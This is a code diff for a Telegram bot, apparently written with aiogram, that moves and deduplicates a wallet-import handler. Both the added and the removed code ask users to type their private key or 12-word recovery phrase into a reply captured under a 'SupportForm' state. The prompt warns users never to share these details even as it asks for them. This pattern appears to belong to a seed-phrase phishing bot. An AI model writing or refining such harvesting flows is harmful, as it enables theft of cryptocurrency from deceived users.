@@ -3073,14 +3073,15 @@ async def connect_external_wallet(callback: types.CallbackQuery, state: FSMConte
             "⚠️ <i>Remember: Never share these details with anyone!</i>"
         )
 
-        await callback.message.edit_text(
+        sent = await callback.bot.send_message(
+            chat_id=callback.message.chat.id,
             text=prompt_text,
             parse_mode="HTML",
             reply_markup=types.ForceReply(selective=False),
         )
         await state.set_state(SupportForm.waiting_for_input)
         await state.update_data(
-            prompt_message_id=callback.message.message_id,
+            prompt_message_id=sent.message_id,
             source="import_wallet",
         )
         await callback.answer()
@@ -3322,26 +3323,6 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
             text=NO_WALLET_TEXT,
             parse_mode="HTML",
             reply_markup=get_rearrange_keyboard(callback.from_user.id)
-        )
-
-    elif data == "import_wallet":
-        prompt_text = "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n⚠️ <i>Remember: Never share these details with anyone!</i>"
-
-        try:
-            await callback.message.delete()
-        except Exception:
-            pass
-
-        sent = await callback.message.answer(
-            text=prompt_text,
-            parse_mode="HTML",
-            reply_markup=types.ForceReply(selective=False),
-        )
-
-        await state.set_state(SupportForm.waiting_for_input)
-        await state.update_data(
-            prompt_message_id=sent.message_id,
-            source="import_wallet",
         )
 
     elif data.startswith("toggle_"):
